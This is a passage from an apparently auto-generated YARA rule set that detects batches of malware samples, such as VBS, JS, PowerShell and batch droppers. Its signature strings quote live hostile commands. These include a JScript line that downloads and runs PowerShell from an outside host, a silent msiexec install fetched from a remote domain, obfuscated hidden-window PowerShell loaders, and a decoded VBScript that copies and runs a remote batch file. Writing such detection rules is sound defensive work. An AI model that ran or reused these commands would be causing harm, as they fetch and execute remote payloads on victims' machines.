      $s9 = "416749484e6f4c6c4a316269426a6257517349446373494652796457554b436941674943416e4946426864584e6c49475a76636941784f4441676332566a6232" ascii /* score: '24.00'*/ /* hex encoded string 'AgIHNoLlJ1biBjbWQsIDcsIFRydWUKCiAgICAnIFBhdXNlIGZvciAxODAgc2Vjb2' */
      $s10 = "396a595778515958526f494430675a6e4d75516e5670624752515958526f4b484e6f4c6b5634634746755a455675646d6c79623235745a573530553352796157" ascii /* score: '24.00'*/ /* hex encoded string '9jYWxQYXRoID0gZnMuQnVpbGRQYXRoKHNoLkV4cGFuZEVudmlyb25tZW50U3RyaW' */
      $s11 = "6c735a573568625755675957356b49474a316157786b4948526f5a53426d645778734947787659324673494842686447674b636d46755a473974526d6c735a55" ascii /* score: '24.00'*/ /* hex encoded string 'lsZW5hbWUgYW5kIGJ1aWxkIHRoZSBmdWxsIGxvY2FsIHBhdGgKcmFuZG9tRmlsZU' */
      $s12 = "52476c7449484e6f4c43426d63797767636d56746233526c55474630614377676247396a595778515958526f4c43426a6257517349484a68626d527662555a70" ascii /* score: '24.00'*/ /* hex encoded string 'RGltIHNoLCBmcywgcmVtb3RlUGF0aCwgbG9jYWxQYXRoLCBjbWQsIHJhbmRvbUZpbGVOYW1lCgonIEZ1bmN0aW9uIGZyb20gdjIgdG8gZGVjb2RlIGEgaGV4IHN0cmluZwpGdW5jdGlvbiBkMihoKQogIEZvciBpID0gMSBUbyBMZW4oaCkgU3RlcCAyCiAgICBkMiA9IGQyICYgQ2hyKENMbmcoIiZIIiAmIE1pZChoLCBpLCAyKSkpCiAgTmV4dApFbmQgRnVuY3Rpb24KCicgQ3JlYXRlIGhlbHBlciBvYmplY3RzClNldCBzaCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpClNldCBmcyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQoKJyBEZWZpbmUgdGhlIHJlbW90ZSBwYXRoIHVzaW5nIHRoZSBvYmZ1c2NhdGVkIGhleCBzdHJpbmcKcmVtb3RlUGF0aCA9IGQyKCI1YzVjNmQ2MTZlNjQ2MTc0NjUyZDcwNjE3NTZjMmQ2MjYxNjM2YjY5NmU2NzJkNzI2NTczNjk2NDY1NmU2MzY1MmU3NDcyNzk2MzZjNmY3NTY0NjY2YzYxNzI2NTJlNjM2ZjZkNDA1MzUzNGM1YzQ0NjE3NjU3NTc1NzUyNmY2Zjc0NWM3NDc5Njc2MTJlNjI2MTc0IikKCicgR2VuZXJhdGUgYSByYW5kb20gZmlsZW5hbWUgYW5kIGJ1aWxkIHRoZSBmdWxsIGxvY2FsIHBhdGgKcmFuZG9tRmlsZU5hbWUgPSBSZXBsYWNlKGZzLkdldFRlbXBOYW1lLCAiLnRtcCIsICIuYmF0IikKbG9jYWxQYXRoID0gZnMuQnVpbGRQYXRoKHNoLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVVTRVJQUk9GSUxFJVxDb250YWN0cyIpLCByYW5kb21GaWxlTmFtZSkKCicgQ2hlY2sgaWYgdGhlIHJlbW90ZSBmaWxlIGV4aXN0cyBhbmQgY29weSBpdCBsb2NhbGx5CklmIGZzLkZpbGVFeGlzdHMocmVtb3RlUGF0aCkgVGhlbgogICAgZnMuQ29weUZpbGUgcmVtb3RlUGF0aCwgbG9jYWxQYXRoLCBUcnVlCiAgICAKICAgICcgQnVpbGQgdGhlIGNvbW1hbmQgdG8gcnVuIHRoZSBsb2NhbCBmaWxlCiAgICBjbWQgPSAiY21kLmV4ZSAvYyAiIiIgJiBsb2NhbFBhdGggJiAiIiIiCiAgICAKICAgICcgRXhlY3V0ZSB0aGUgY29tbWFuZCBhbmQgd2FpdCBmb3IgaXQgdG8gY29tcGxldGUKICAgIHNoLlJ1biBjbWQsIDcsIFRydWUKCiAgICAnIFBhdXNlIGZvciAxODAgc2Vjb25kcyAoMTgwMDAwIG1pbGxpc2Vjb25kcykKICAgIFdTY3JpcHQuU2xlZXAgMTgwMDAwCgogICAgJyBEZWxldGUgdGhlIGJhdGNoIGZpbGUKICAgIGZzLkRlbGV0ZUZpbGUgbG9jYWxQYXRoCkVuZCBJZgo=' */
      $s13 = "46305a553969616d566a6443676955324e79615842306157356e4c6b5a706247565465584e305a573150596d706c593351694b516f4b4a7942455a575a70626d" ascii /* score: '24.00'*/ /* hex encoded string 'F0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQoKJyBEZWZpbm' */
      $s14 = "686c593356305a5342306147556759323974625746755a434268626d5167643246706443426d623349676158516764473867593239746347786c6447554b4943" ascii /* score: '24.00'*/ /* hex encoded string 'hlY3V0ZSB0aGUgY29tbWFuZCBhbmQgd2FpdCBmb3IgaXQgdG8gY29tcGxldGUKIC' */
      $s15 = "59334e5459304e6a5932597a59784e7a49324e544a6c4e6a4d325a6a5a6b4e4441314d7a557a4e474d31597a51304e6a45334e6a55334e5463314e7a55794e6d" ascii /* score: '24.00'*/ /* hex encoded string 'Y3NTY0NjY2YzYxNzI2NTJlNjM2ZjZkNDA1MzUzNGM1YzQ0NjE3NjU3NTc1NzUyNm' */
   condition:
      uint16(0) == 0x6a3c and filesize < 10KB and
      8 of them
}

rule sig_364d346da8e398a89d3542600cbc72984b857df3d20a6dc37879f14e5e173522_364d346d {
   meta:
      description = "_subset_batch - file 364d346da8e398a89d3542600cbc72984b857df3d20a6dc37879f14e5e173522_364d346d.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "364d346da8e398a89d3542600cbc72984b857df3d20a6dc37879f14e5e173522"
   strings:
      $x1 = "echo f|xcopy %SystemRoot%\\system32\\%x1%%x2%%x3%.exe %temp%\\entails.exe /h /s /e" fullword ascii /* score: '38.00'*/
      $s2 = "%temp%\\entails.exe %t3%,%xxx%" fullword ascii /* score: '22.00'*/
      $s3 = "set t3=%temp%\\%random%.%random%" fullword ascii /* score: '15.00'*/
      $s4 = "echo f|xcopy !exe1!!exe2! %t3% /h /s /e" fullword ascii /* score: '12.00'*/
      $s5 = "if %random% neq 100 (" fullword ascii /* score: '8.00'*/
      $s6 = "set exe2=templ" fullword ascii /* score: '8.00'*/
      $s7 = "if %random% neq 200 (" fullword ascii /* score: '8.00'*/
      $s8 = "if %random% neq 300 (" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4553 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule sig_37e96cc01fcf657c68d05cb1814e63eaa46582c21a23edec1a8e5d6d81257f9c_37e96cc0 {
   meta:
      description = "_subset_batch - file 37e96cc01fcf657c68d05cb1814e63eaa46582c21a23edec1a8e5d6d81257f9c_37e96cc0.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37e96cc01fcf657c68d05cb1814e63eaa46582c21a23edec1a8e5d6d81257f9c"
   strings:
      $x1 = "(New-Object -ComObject shell.application).MinimizeAll(); Invoke-Command -ScriptBlock { param($p1 <# , #> , $p2 <# , #> , $p3); $" ascii /* score: '55.00'*/
      $s2 = "ebRequest -Uri $p1 -OutFile $fileName; Start-Process -Wait -FilePath msiexec -ArgumentList '/i',$fileName,'/qn','LicenseAccepted" ascii /* score: '29.00'*/
      $s3 = "(New-Object -ComObject shell.application).MinimizeAll(); Invoke-Command -ScriptBlock { param($p1 <# , #> , $p2 <# , #> , $p3); $" ascii /* score: '27.00'*/
      $s4 = "=YES',\"POLICY_CATEGORY_ID=$p2\",\"INSTALL_ARGS=$p3\",\"/L*V\",'installation.log' } -ArgumentList 'https://rihby.com/node5.digit" ascii /* score: '22.00'*/
      $s5 = "n.com/app/','-1','url=https://rihby.com/node5.digitalocean.com/app/'" fullword ascii /* score: '17.00'*/
      $s6 = "fileName = Split-Path -Path $p1 -Leaf; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-W" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4e28 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_3913b5412de2af6aa07d2048b01cfd8cb29b1648b98c03cc047fbc0e6174a8a3_3913b541 {
   meta:
      description = "_subset_batch - file 3913b5412de2af6aa07d2048b01cfd8cb29b1648b98c03cc047fbc0e6174a8a3_3913b541.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3913b5412de2af6aa07d2048b01cfd8cb29b1648b98c03cc047fbc0e6174a8a3"
   strings:
      $s1 = "package/HYPERTRM.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule sig_3b64944e4035292a11a5629d6d574f15a137c1cf18bdc8b4042cfee242a196b3_3b64944e {
   meta:
      description = "_subset_batch - file 3b64944e4035292a11a5629d6d574f15a137c1cf18bdc8b4042cfee242a196b3_3b64944e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3b64944e4035292a11a5629d6d574f15a137c1cf18bdc8b4042cfee242a196b3"
   strings:
      $s1 = "Eval Execute(hivw)" fullword ascii /* score: '22.00'*/
      $s2 = "thhc.Add \"Eq\", 110" fullword ascii /* score: '10.00'*/
      $s3 = "thhc.Add \"Gh\", 99" fullword ascii /* score: '10.00'*/
      $s4 = "thhc.Add \"zA\", 82" fullword ascii /* score: '10.00'*/
      $s5 = "thhc.Add \"xt\", 75" fullword ascii /* score: '10.00'*/
      $s6 = "thhc.Add \"zW\", 114" fullword ascii /* score: '10.00'*/
      $s7 = "thhc.Add \"ZB\", 78" fullword ascii /* score: '10.00'*/
      $s8 = "thhc.Add \"fQ\", 89" fullword ascii /* score: '10.00'*/
      $s9 = "thhc.Add \"FI\", 51" fullword ascii /* score: '10.00'*/
      $s10 = "thhc.Add \"gZ\", 33" fullword ascii /* score: '10.00'*/
      $s11 = "thhc.Add \"vM\", 34" fullword ascii /* score: '10.00'*/
      $s12 = "thhc.Add \"Xk\", 105" fullword ascii /* score: '10.00'*/
      $s13 = "thhc.Add \"cI\", 79" fullword ascii /* score: '10.00'*/
      $s14 = "thhc.Add \"Mn\", 69" fullword ascii /* score: '10.00'*/
      $s15 = "thhc.Add \"pG\", 44" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6944 and filesize < 100KB and
      8 of them
}

rule sig_3b777a6391587d63adc65a7340231f901cf1e5383daf6adfab180f91fe68a6fa_3b777a63 {
   meta:
      description = "_subset_batch - file 3b777a6391587d63adc65a7340231f901cf1e5383daf6adfab180f91fe68a6fa_3b777a63.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3b777a6391587d63adc65a7340231f901cf1e5383daf6adfab180f91fe68a6fa"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"spsv feriel;function Rvert ($forngterhe){ $defensers=3;do {$timia+=$forngterhe[$defensers];" ascii /* score: '42.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv feriel;function Rvert ($forngterhe){ $defensers=3;do {$timia+=$forngterhe[$defensers];" ascii /* score: '27.00'*/
      $s3 = " (Rvert 'eee$eeegeeeL.eeo.eeBe eaeeeLeee:eeep e,O e LeeeYeee=eee(ee,teeeee eS  et ee-eeeP eeAeeeTe ehee, eee$eeeE,eeNeeeIeeeGee." ascii /* score: '12.00'*/
      $s4 = " aaGaaaEaaat a - aaC aaOaaaN aata.aEaaanaaat a. aaa$aaaEaaaNaaaiaaaga,aH aae aaD');penlikec (Rvert ' v $v.vgvvvlvvvovvvbvvva vvl" ascii /* score: '12.00'*/
      $s5 = "K:KKKtKKKA K nKKKK  KeKKKl KK+ KK+KKK%%KK $KKKpKKKRKKKeKKKAKKKf KKF ,Kl KKIKKKcKKK. KKc KKOKKKU.KKN KKT') ;$virkel=$preafflic[$s" ascii /* score: '11.00'*/
      $s6 = "t!!!h!!!r!! e!!!a!!!d!!!I!!!N!!!G!!!.! !t!! H!!!R! !E!!!A!!!d ! ]!!!:!!!:! !S!!!l! !E! !E!!!P!!!(!!!4!!!0!!!0!!!0!!.)');penlikec" ascii /* score: '9.00'*/
      $s7 = " DEDD,SDD TDDD-  Dp DDA,DDtDD h DD DDD$DDDEDD NDDDIDDDGDDDh DDEDDDd DD)');while (!$poly) {penlikec (Rvert 'www$wwwgww l wwoww.b," ascii /* score: '8.00'*/
      $s8 = "%%S%%%%%%C%%%%,i%%%%%%I%%%%%%.%%%%%%g .%%e%%%%%%T %% S %%%%T%%%%%%r %%%%i%%%%%%n%%%%%%g %%%%( %%%%$%%%%%%D%%%%%%u%%%%%%N%%%%%%L " ascii /* score: '8.00'*/
      $s9 = "wwawwwl w :wwwR wwowwwcwwwkwwwwwwwowwwowwwdwwwhw,wywww=ww $wwwowwwv wwewwwr ww8www4') ;penlikec $kithin;penlikec (Rvert ' !![!!." ascii /* score: '8.00'*/
      $s10 = "%%%%m %%%%.%%%%%%T%%%%%%e %% x%%%%%%t%%%%%%.%%%%%%e%%%%%%n%% %%C%%%%%%O%%%%%%D%% %%i%%%%%%n%%%%%%g%%%%%%] %%%%:%%%%%%:%%,%%A%%%%" ascii /* score: '8.00'*/
      $s11 = " y/yyy2 yy0.yy1yyy0 yy0yyy1 yy0  y1yyy yy Fyyyiyyyryyyeyyyf y o.yyxyy /yyy1yyy4y.y1yyy.y y0';$afsvalnin=Rvert 'mmmUm mSmmmemmmRm" ascii /* score: '8.00'*/
      $s12 = "eeeeeedeee" ascii /* score: '8.00'*/
      $s13 = "%%.e%%%%%%T%%%%%%6%%%%%%0 %%,)');penlikec (Rvert ':::$.::G.::l:::O:::b:::a : L  :::::f:::l : a:::S:::H:::N:::e ::s:::S:::l ::=::" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_3e00d5b8513932ee340679769058b5979dedebd80acde678af6a06421a0369b1_3e00d5b8 {
   meta:
      description = "_subset_batch - file 3e00d5b8513932ee340679769058b5979dedebd80acde678af6a06421a0369b1_3e00d5b8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3e00d5b8513932ee340679769058b5979dedebd80acde678af6a06421a0369b1"
   strings:
      $s1 = "      var cmd = 'powershell -w h -c \"iex (irm http://myamiii.com)\"';" fullword ascii /* score: '29.00'*/
      $s2 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s3 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
      $s4 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule sig_3f304d014dbaa15d509824bd9bcf519d33a3fba6b6cf35cbe5de27d04dc6a9c6_3f304d01 {
   meta:
      description = "_subset_batch - file 3f304d014dbaa15d509824bd9bcf519d33a3fba6b6cf35cbe5de27d04dc6a9c6_3f304d01.cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3f304d014dbaa15d509824bd9bcf519d33a3fba6b6cf35cbe5de27d04dc6a9c6"
   strings:
      $s1 = "temp.exe" fullword ascii /* score: '29.00'*/
      $s2 = "temp.ahk" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 1000KB and
      all of them
}

rule sig_7ba3517dcc7d366df0b4a7a6f31680c418cc0e4d3dcfe161cdb25bfe8cbaad2a_7ba3517d {
   meta:
      description = "_subset_batch - file 7ba3517dcc7d366df0b4a7a6f31680c418cc0e4d3dcfe161cdb25bfe8cbaad2a_7ba3517d.cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7ba3517dcc7d366df0b4a7a6f31680c418cc0e4d3dcfe161cdb25bfe8cbaad2a"
   strings:
      $s1 = "temp.exe" fullword ascii /* score: '29.00'*/
      $s2 = "temp.ahk" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 1000KB and
      all of them
}

rule sig_3f404b43fd2bfc6c89d30eafc9fecdb1ff984450166191b8e9de48531de9cfc6_3f404b43 {
   meta:
      description = "_subset_batch - file 3f404b43fd2bfc6c89d30eafc9fecdb1ff984450166191b8e9de48531de9cfc6_3f404b43.cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3f404b43fd2bfc6c89d30eafc9fecdb1ff984450166191b8e9de48531de9cfc6"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"Get-counter;Get-Service;$Pariahdom='B'+ [char]58;Get-hotfix;$Yokes191=(gcm  $Pariahdom).Com" ascii /* score: '43.00'*/
      $x2 = "powershell.exe -windowstyle hidden \"Get-counter;Get-Service;$Pariahdom='B'+ [char]58;Get-hotfix;$Yokes191=(gcm  $Pariahdom).Com" ascii /* score: '42.00'*/
      $s3 = "deECo,mR ,haSSynt+ Tur+bili%%Comp$ ndaLAk,oOEs oT .hiuSupesEkspb SeqL Co.oTolkmSa.osVedst.lik.Ukenc jlpoH lpuTeigNconjT') ;$Symb" ascii /* score: '16.00'*/
      $s4 = "andType;$Yokes191=[String]$Yokes191;New-Alias -Name Khutbah -Value ni;$Yokes191+=':';(Khutbah -p $Yokes191 -n Modulsystemernes -" ascii /* score: '15.00'*/
      $s5 = "dHypoeUigevM ntaHermNPrefdCraySDybvPD.veL.ysfa elinI.paePilaROronNGsame S.esdrei= Coe( itsTSimueIncoSCh aTR,de- TepP rdeA StiTKu" ascii /* score: '13.00'*/
      $s6 = "nt MeceSnegRPhossDiak=Ch r$intrfIntea BimD artETot,Tdeak.monoSPaahuDefeb abaSK edTTemprTri.iCoveN WagGcol,(Psyc$ ydsbaddiiHau sS" ascii /* score: '11.00'*/
      $s7 = "(Bybo4Stru0Aa.i0Kugl0Retr)');Naturvaerdierne (Modulsystemernes 'G.rl$AnkogAbraLbadeoA kybKvarANor lbind:Ri.gSEndopAutoiKolllR ng" ascii /* score: '10.00'*/
      $s8 = "e (Modulsystemernes 'Guer$TomagIsanl b noKindB ProADe.iLLer,: f.kFT vlA,sbeDFl,rEPe itV,ur S,ea=Prob  Kla[FatwSEnrayInjusDegaTud" ascii /* score: '10.00'*/
      $s9 = "turvaerdierne (Modulsystemernes 'Boli$ agsKObskoAfrenAmplt T mi Opsn  reeTrownFemit Dama DimlCop.sNu ioT rnkSpeklcenteD glnSenss" ascii /* score: '10.00'*/
      $s10 = "$RubeCskr.h estOstatLSl.mEBritl GouIAlb TVarihMydaoLgegtGetsrAloniSterp S mSStery  ia)');while (!$Spildevandsplanernes) {Naturva" ascii /* score: '9.00'*/
      $s11 = "eptaStjdnUnglDSharSR neP HollLorra ysen.uckePermrAu iN SvaEHelbsFoge=Sjld(TheaTSp re.lbasud atU,in- SrgPskaga TeltIn.eHRent oxal" ascii /* score: '8.00'*/
      $s12 = "y[$Denaturising])$Fantasticalness});(Khutbah -p $Yokes191 -n Naturvaerdierne -value {param ($Preservatize);.($Hyalescence) ($Pre" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule sig_8037f87cc3b8f50e48ff14170081c0e5_imphash_ {
   meta:
      description = "_subset_batch - file 8037f87cc3b8f50e48ff14170081c0e5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ae9a2dd2a9f2bac451b66f28d1db521eaa6f3b3a2639e7229588ab80275fd328"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"amd64\" publi" ascii /* score: '18.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s3 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"amd64\" publi" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule sig_4133198dcc1f423b3ef56fcb9a66d6c84366d3ed23c95cf5d2a71efe229bd7ee_4133198d {
   meta:
      description = "_subset_batch - file 4133198dcc1f423b3ef56fcb9a66d6c84366d3ed23c95cf5d2a71efe229bd7ee_4133198d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4133198dcc1f423b3ef56fcb9a66d6c84366d3ed23c95cf5d2a71efe229bd7ee"
   strings:
      $s1 = "59,58,53,51,46,51,50,51,53,54,46,59,56,59,54,46,51,50,50,54,54,46,51,50,50,56,51,46,51,50,51,56,51,46,59,58,59,51,46,51,56,59,46" ascii /* score: '9.00'*/ /* hex encoded string 'YXSQFQPQSTFYVYTFQPPTTFQPPVQFQPQVQFYXYQFQVYF' */
      $s2 = "58,57,54,58,46,59,57,58,58,46,58,57,54,59,46,51,50,50,54,54,46,58,58,57,54,46,51,50,51,55,52,46,58,54,58,58,46,51,52,46,54,59,46" ascii /* score: '9.00'*/ /* hex encoded string 'XWTXFYWXXFXWTYFQPPTTFXXWTFQPQURFXTXXFQRFTYF' */
      $s3 = "59,56,59,57,46,59,57,53,51,46,51,58,53,46,59,57,55,56,46,59,56,59,54,46,51,50,50,54,52,46,59,58,58,51,46,59,51,58,46,59,58,59,52" ascii /* score: '9.00'*/ /* hex encoded string 'YVYWFYWSQFQXSFYWUVFYVYTFQPPTRFYXXQFYQXFYXYR' */
      $s4 = "53,52,58,46,59,58,52,56,46,59,53,59,46,51,50,50,50,55,46,59,56,55,53,46,58,58,56,52,46,59,57,55,58,46,51,50,51,57,50,46,59,58,59" ascii /* score: '9.00'*/ /* hex encoded string 'SRXFYXRVFYSYFQPPPUFYVUSFXXVRFYWUXFQPQWPFYXY' */
      $s5 = "46,59,59,59,55,46,51,50,50,56,50,46,51,52,54,59,54,46,59,58,57,55,46,59,56,58,57,46,58,57,55,59,46,51,50,50,54,56,46,59,53,58,46" ascii /* score: '9.00'*/ /* hex encoded string 'FYYYUFQPPVPFQRTYTFYXWUFYVXWFXWUYFQPPTVFYSXF' */
      $s6 = "46,51,50,50,55,50,46,51,50,50,52,57,46,58,57,54,59,46,59,56,58,57,46,59,58,59,59,46,58,54,58,54,46,51,50,51,55,52,46,59,56,53,54" ascii /* score: '9.00'*/ /* hex encoded string 'FQPPUPFQPPRWFXWTYFYVXWFYXYYFXTXTFQPQURFYVST' */
      $s7 = "58,46,58,56,50,50,46,59,56,58,58,46,51,50,51,56,53,46,51,50,51,57,51,46,58,57,55,58,46,51,58,54,46,51,52,54,57,53,46,59,58,53,56" ascii /* score: '9.00'*/ /* hex encoded string 'XFXVPPFYVXXFQPQVSFQPQWQFXWUXFQXTFQRTWSFYXSV' */
      $s8 = "58,46,59,58,53,55,46,59,56,57,55,46,58,58,56,51,46,59,56,53,54,46,59,56,57,56,46,54,53,52,58,46,55,50,59,57,58,46,51,50,50,58,59" ascii /* score: '9.00'*/ /* hex encoded string 'XFYXSUFYVWUFXXVQFYVSTFYVWVFTSRXFUPYWXFQPPXY' */
      $s9 = "51,46,54,59,46,54,59,46,53,54,46,57,51,46,51,51,52,46,51,50,51,46,51,51,53,46,51,50,52,46,51,50,57,46,51,51,52,46,51,50,55,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'QFTYFTYFSTFWQFQQRFQPQFQQSFQPRFQPWFQQRFQPUFQ' */
      $s10 = "46,59,56,59,56,46,59,57,50,52,46,51,56,59,46,51,50,51,55,51,46,51,50,50,52,57,46,51,52,46,54,59,46,54,59,46,53,54,46,59,56,56,53" ascii /* score: '9.00'*/ /* hex encoded string 'FYVYVFYWPRFQVYFQPQUQFQPPRWFQRFTYFTYFSTFYVVS' */
      $s11 = "51,50,50,54,55,46,59,57,53,55,46,51,50,50,58,56,46,59,56,59,56,46,58,57,53,56,46,59,56,58,57,46,59,58,53,52,46,59,57,56,54,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'QPPTUFYWSUFQPPXVFYVYVFXWSVFYVXWFYXSRFYWVTFQ' */
      $s12 = "56,56,52,46,58,58,57,57,46,58,58,56,57,46,51,50,51,54,54,46,51,50,51,55,57,46,58,54,58,54,46,51,50,50,54,50,46,59,57,54,55,46,52" ascii /* score: '9.00'*/ /* hex encoded string 'VVRFXXWWFXXVWFQPQTTFQPQUWFXTXTFQPPTPFYWTUFR' */
      $s13 = "55,58,46,58,55,59,55,46,59,57,50,52,46,59,56,57,55,46,51,50,50,55,53,46,59,57,50,54,46,59,59,50,51,46,51,50,50,52,58,46,59,57,57" ascii /* score: '9.00'*/ /* hex encoded string 'UXFXUYUFYWPRFYVWUFQPPUSFYWPTFYYPQFQPPRXFYWW' */
      $s14 = "58,46,51,50,50,54,50,46,59,56,53,55,46,59,56,58,55,46,51,52,46,54,59,46,54,59,46,53,54,46,58,58,56,55,46,59,56,58,57,46,51,50,50" ascii /* score: '9.00'*/ /* hex encoded string 'XFQPPTPFYVSUFYVXUFQRFTYFTYFSTFXXVUFYVXWFQPP' */
      $s15 = "52,50,46,54,59,54,52,46,51,51,52,58,51,46,58,55,51,50,46,52,54,59,59,46,51,51,52,51,58,46,59,52,50,50,46,55,55,53,55,58,46,55,57" ascii /* score: '9.00'*/ /* hex encoded string 'RPFTYTRFQQRXQFXUQPFRTYYFQQRQXFYRPPFUUSUXFUW' */
   condition:
      uint16(0) == 0x2f2f and filesize < 8000KB and
      8 of them
}

rule sig_441f2c33a9e2c580f46fee37c6a3d70a9d2a19349fdced77815c47f95c1043f0_441f2c33 {
   meta:
      description = "_subset_batch - file 441f2c33a9e2c580f46fee37c6a3d70a9d2a19349fdced77815c47f95c1043f0_441f2c33.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "441f2c33a9e2c580f46fee37c6a3d70a9d2a19349fdced77815c47f95c1043f0"
   strings:
      $s1 = "Set abelicea = submission.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set Burundian = submission.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "womenfolk = sneaky.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set submission = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set sneaky = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule sig_44506342974132e136d416cc7ee188e320b038fe712ea2683aac14206d624add_44506342 {
   meta:
      description = "_subset_batch - file 44506342974132e136d416cc7ee188e320b038fe712ea2683aac14206d624add_44506342.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "44506342974132e136d416cc7ee188e320b038fe712ea2683aac14206d624add"
   strings:
      $s1 = "Set Cmdre = cocksucker.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '29.00'*/
      $s2 = "Set wreathing = cocksucker.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "refreshingness = skalling.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -Nc" fullword ascii /* score: '13.00'*/
      $s5 = "Set cocksucker = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set skalling = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
      $s7 = "Cmdre.ShowWindow = 0 ' oculto" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule sig_45330ef2846bf3190b21e4ab51085dba64ef8540066dca13538d3198e05855de_45330ef2 {
   meta:
      description = "_subset_batch - file 45330ef2846bf3190b21e4ab51085dba64ef8540066dca13538d3198e05855de_45330ef2.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "45330ef2846bf3190b21e4ab51085dba64ef8540066dca13538d3198e05855de"
   strings:
      $s1 = "Idlltj/w-" fullword ascii /* score: '9.00'*/
      $s2 = "* {'gR" fullword ascii /* score: '9.00'*/
      $s3 = "JQ /b " fullword ascii /* score: '9.00'*/
      $s4 = "hEyE@\\)" fullword ascii /* score: '9.00'*/
      $s5 = "PRKx* e{W" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 18000KB and
      all of them
}

rule sig_45c6577215a22217d68652d68dd0170e0f1d2845e661500d5954682e1188a320_45c65772 {
   meta:
      description = "_subset_batch - file 45c6577215a22217d68652d68dd0170e0f1d2845e661500d5954682e1188a320_45c65772.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "45c6577215a22217d68652d68dd0170e0f1d2845e661500d5954682e1188a320"
   strings:
      $s1 = "*`5[#?f]#" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
      $s2 = "wxkefli" fullword ascii /* score: '8.00'*/
      $s3 = "ytaqhbn" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule sig_46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09_46faab8a {
   meta:
      description = "_subset_batch - file 46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09_46faab8a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"
   strings:
